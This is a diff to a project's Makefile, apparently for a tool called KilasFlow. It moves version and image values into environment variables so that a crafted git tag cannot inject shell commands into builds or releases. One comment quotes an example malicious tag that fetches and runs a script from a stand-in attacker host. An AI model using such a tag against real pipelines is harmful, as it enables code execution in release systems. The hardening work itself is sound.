@@ -5,7 +5,10 @@ SDK_DIR     := sdk
 DIST_DIR    := internal/web/dist
 BIN_DIR     := bin
 VERSION     ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "0.1.0-dev")
-LDFLAGS     := -s -w -X main.version=$(VERSION)
+# Read from the environment for the reason IMAGE_ARGS is: a git ref name may
+# contain a double quote, so `-ldflags="… -X main.version=$(VERSION)"` lets a
+# crafted tag close the quoting and run a command during an ordinary build.
+LDFLAGS     := -s -w -X main.version=$$KILASFLOW_VERSION
 GO_BIN      := $(shell $(GO) env GOBIN 2>/dev/null)
 
 # Published image coordinates. IMAGE is the product name rather than the
@@ -24,9 +27,26 @@ IMAGE_METADATA ?= .tmp/image-metadata.json
 # One list shared by every image target. A locally built image and a published one
 # come from the same Dockerfile and the same arguments, which is what makes
 # reproducing a published image from a commit possible at all.
-IMAGE_ARGS  := --build-arg VERSION=$(VERSION) \
-               --build-arg REVISION=$(REVISION) \
-               --build-arg SOURCE=$(SOURCE_URL)
+#
+# The values are read from the environment rather than interpolated, and that is
+# a security property rather than a style. VERSION reaches these recipes from
+# `git describe --tags` or from a workflow's github.ref_name, and a git tag may
+# legally contain a single quote — so `-t '$(VERSION)'` would let a tag named
+#   v1.0.0'; curl evil.example/x | sh; '
+# close the quote and run a command inside the release pipeline. Make puts a
+# target-specific export straight into the child's environment without a shell
+# ever parsing it, so the value below is data no matter what it contains.
+IMAGE_ARGS  := --build-arg VERSION="$$KILASFLOW_VERSION" \
+               --build-arg REVISION="$$KILASFLOW_REVISION" \
+               --build-arg SOURCE="$$KILASFLOW_SOURCE"
+
+# Every recipe that names an image or a version gets them this way.
+IMAGE_TARGETS := build docker docker-multiarch docker-release docker-sign smoke-docker-published
+$(IMAGE_TARGETS): export KILASFLOW_IMAGE = $(IMAGE)
+$(IMAGE_TARGETS): export KILASFLOW_VERSION = $(VERSION)
+$(IMAGE_TARGETS): export KILASFLOW_REVISION = $(REVISION)
+$(IMAGE_TARGETS): export KILASFLOW_SOURCE = $(SOURCE_URL)
+$(IMAGE_TARGETS): export KILASFLOW_APP_NAME = $(APP_NAME)
 
 ifeq ($(strip $(GO_BIN)),)
 GO_BIN      := $(shell $(GO) env GOPATH 2>/dev/null)/bin
@@ -103,7 +123,7 @@ build: dist-placeholder ## Build the production binary (run build-web first for 
 		-ldflags="$(LDFLAGS)" \
 		-o $(BIN_DIR)/$(APP_NAME) \
 		./cmd/$(APP_NAME)
-	@echo "built $(BIN_DIR)/$(APP_NAME) ($(VERSION))"
+	@echo "built $(BIN_DIR)/$(APP_NAME) ($$KILASFLOW_VERSION)"
 
 .PHONY: build-all
 build-all: build-web build ## Full production build: SPA embedded in the binary
@@ -186,7 +206,9 @@ tidy: ## Tidy go.mod
 
 .PHONY: docker
 docker: ## Build the Docker image for this machine's architecture
-	docker build $(IMAGE_ARGS) -t $(APP_NAME):$(VERSION) -t $(APP_NAME):latest .
+	docker build $(IMAGE_ARGS) \
+		-t "$$KILASFLOW_APP_NAME:$$KILASFLOW_VERSION" \
+		-t "$$KILASFLOW_APP_NAME:latest" .
 
 # Cross-builds both published architectures and throws the result away. This is
 # what a pull request runs: without it the arm64 path is first exercised while
@@ -207,7 +229,7 @@ docker-release: ## Build and push the multi-architecture image (VERSION must be 
 	docker buildx build \
 		--platform $(PLATFORMS) \
 		$(IMAGE_ARGS) \
-		$$(sh scripts/docker-tags.sh '$(IMAGE)' '$(VERSION)') \
+		$$(sh scripts/docker-tags.sh) \
 		--sbom=true \
 		--provenance=mode=max \
 		--metadata-file $(IMAGE_METADATA) \
@@ -222,8 +244,12 @@ docker-release: ## Build and push the multi-architecture image (VERSION must be 
 docker-sign: ## Sign the image docker-release just pushed (needs cosign and an OIDC token)
 	@test -f $(IMAGE_METADATA) || { \
 		echo "$(IMAGE_METADATA) is missing; run make docker-release first" >&2; exit 1; }
-	cosign sign --yes \
-		$(IMAGE)@$$(sed -n 's/.*"containerimage.digest"[^"]*"\([^"]*\)".*/\1/p' $(IMAGE_METADATA))
+	@digest=$$(sed -n 's/.*"containerimage.digest"[^"]*"\([^"]*\)".*/\1/p' $(IMAGE_METADATA)); \
+	case "$$digest" in \
+		sha256:*) ;; \
+		*) echo "no image digest in $(IMAGE_METADATA); run make docker-release first" >&2; exit 1 ;; \
+	esac; \
+	cosign sign --yes "$$KILASFLOW_IMAGE@$$digest"
 
 .PHONY: corpus
 corpus: ## Fetch the n8n importer regression corpus (needs KILASFLOW_N8N_REFERENCE)
@@ -271,7 +297,8 @@ smoke-docker: ## Prove the non-root Docker image against a persisted SQLite bind
 # to prove the other half of the list.
 .PHONY: smoke-docker-published
 smoke-docker-published: ## Prove the published image by pulling it (VERSION must be a published tag)
-	KILASFLOW_SMOKE_IMAGE='$(IMAGE):$(VERSION)' KILASFLOW_SMOKE_PULL=1 sh scripts/smoke-docker.sh
+	KILASFLOW_SMOKE_IMAGE="$$KILASFLOW_IMAGE:$$KILASFLOW_VERSION" \
+		KILASFLOW_SMOKE_PULL=1 sh scripts/smoke-docker.sh
 
 .PHONY: smoke-postgres
 smoke-postgres: ## Prove the Docker image against the temporary Compose PostgreSQL service
